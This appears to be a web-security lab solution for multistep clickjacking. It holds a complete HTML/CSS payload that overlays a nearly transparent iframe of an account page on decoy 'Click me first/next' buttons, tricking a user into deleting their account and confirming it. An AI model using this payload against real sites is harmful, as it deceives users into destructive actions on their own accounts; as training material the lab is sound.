# Lab: Multistep clickjacking

Position elements so that the user clicks delete account, then clicks the button that confirms the deletion.

```
<style>
	iframe {
		position:relative;
		width: 500px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:295px;
		left:225px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://acde1fc11fb423e8c0f4244e00aa003f.web-security-academy.net/my-account"></iframe>
```